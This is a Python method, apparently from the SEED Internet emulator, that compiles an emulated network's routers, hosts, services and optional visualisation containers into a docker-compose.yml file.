  "def _doCompile(self, emulator: Emulator):\n        registry = emulator.getRegistry()\n\n        self._groupSoftware(emulator)\n\n        for ((scope, type, name), obj) in registry.getAll().items():\n\n            if type == 'net':\n                self._log('creating network: {}/{}...'.format(scope, name))\n                self.__networks += self._compileNet(obj)\n\n        for ((scope, type, name), obj) in registry.getAll().items():\n            if type == 'rnode':\n                self._log('compiling router node {} for as{}...'.format(name, scope))\n                self.__services += self._compileNode(obj)\n\n            if type == 'csnode':\n                self._log('compiling control service node {} for as{}...'.format(name, scope))\n                self.__services += self._compileNode(obj)\n\n            if type == 'hnode':\n                self._log('compiling host node {} for as{}...'.format(name, scope))\n                self.__services += self._compileNode(obj)\n\n            if type == 'rs':\n                self._log('compiling rs node for {}...'.format(name))\n                self.__services += self._compileNode(obj)\n\n            if type == 'snode':\n                self._log('compiling service node {}...'.format(name))\n                self.__services += self._compileNode(obj)\n\n        if self.__internet_map_enabled:\n            self._log('enabling seedemu-internet-map...')\n\n            self.__services += DockerCompilerFileTemplates['seedemu_internet_map'].format(\n                clientImage = SEEDEMU_INTERNET_MAP_IMAGE,\n                clientPort = self.__internet_map_port\n            )\n\n        if self.__ether_view_enabled:\n            self._log('enabling seedemu-ether-view...')\n\n            self.__services += DockerCompilerFileTemplates['seedemu_ether_view'].format(\n                clientImage = SEEDEMU_ETHER_VIEW_IMAGE,\n                clientPort = self.__ether_view_port\n            )\n\n        local_images = ''\n\n        for (image, _) in self.__images.values():\n            if image.getName() not in self._used_images or not image.isLocal(): continue\n            local_images += DockerCompilerFileTemplates['local_image'].format(\n                imageName = image.getName(),\n                dirName = image.getDirName()\n            )\n\n        self._log('creating docker-compose.yml...'.format(scope, name))\n        print(DockerCompilerFileTemplates['compose'].format(\n            services = self.__services,\n            networks = self.__networks,\n            dummies = local_images + self._makeDummies()\n        ), file=open('docker-compose.yml', 'w'))"
]